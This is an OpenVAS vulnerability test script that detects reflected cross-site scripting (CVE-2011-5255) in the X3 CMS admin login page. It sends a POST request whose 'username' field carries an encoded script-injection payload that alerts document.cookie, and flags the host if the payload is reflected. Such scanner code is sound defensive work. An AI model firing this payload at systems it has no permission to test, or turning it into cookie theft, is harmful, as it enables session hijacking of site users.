###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_x3cms_mult_xss_vuln.nasl 11865 2018-10-12 10:03:43Z cfischer $
#
# X3 CMS Multiple cross-site scripting (XSS) vulnerabilities
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803403");
  script_version("$Revision: 11865 $");
  script_cve_id("CVE-2011-5255");
  script_bugtraq_id(51346);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 12:03:43 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2013-02-05 13:26:26 +0530 (Tue, 05 Feb 2013)");
  script_name("X3 CMS Multiple cross-site scripting (XSS) vulnerabilities");

  script_xref(name:"URL", value:"http://secunia.com/advisories/46748");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/72279");
  script_xref(name:"URL", value:"http://www.infoserve.de/system/files/advisories/INFOSERVE-ADV2011-04.txt");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute arbitrary HTML
  and script code in a users browser session in context of an affected site and
  launch other attacks.");
  script_tag(name:"affected", value:"X3CMS version 0.4.3.1-STABLE and prior");
  script_tag(name:"insight", value:"- Input passed via the URL to admin/login is not properly sanitised before
    being returned to the user.

  - Input passed via the 'username' and 'password' POST parameters to
    admin/login (when e.g. other POST parameters are not set) is not properly
    sanitised before being returned to the user.");
  script_tag(name:"solution", value:"Apply the patch from the referenced advisory.");
  script_tag(name:"summary", value:"The host is installed with x3cms and is prone to multiple cross-site
  scripting vulnerabilities.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");
  script_xref(name:"URL", value:"http://www.x3cms.net/");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!can_host_php(port:port)){
  exit(0);
}

host = http_host_name(port:port);

foreach dir (make_list_unique("/", "/x3cms", "/cms", cgi_dirs(port:port)))
{

  if(dir == "/") dir = "";

  sndReq = http_get(item:string(dir, "/admin/login.php"), port:port);
  rcvRes = http_keepalive_send_recv(port:port, data:sndReq, bodyonly:TRUE);

  if(rcvRes && ('>User login | X3CMS<' >< rcvRes && ">X3 CMS<" >< rcvRes ))
  {
    postdata = "username=%27%22%3C%2Fscript%3E%3Cscript%3Ealert%28"+
               "document.cookie%29%3C%2Fscript%3E&password=&captcha"+
               "=&x4token=e14d2ab67683e7faa09983fb521e4835&nigolmrof=";

    req = string("POST ", dir, "/admin/login.php HTTP/1.1\r\n",
                 "Host: ", host, "\r\n",
                 "Content-Type: application/x-www-form-urlencoded\r\n",
                 "Content-Length: ", strlen(postdata), "\r\n",
                 "\r\n", postdata);

    res = http_keepalive_send_recv(port:port, data:req);

    if(res =~ "HTTP/1\.. 200" && "</script><script>alert(document.cookie)</script>" >< res)
    {
      security_message(port:port);
      exit(0);
    }
  }
}

exit(99);
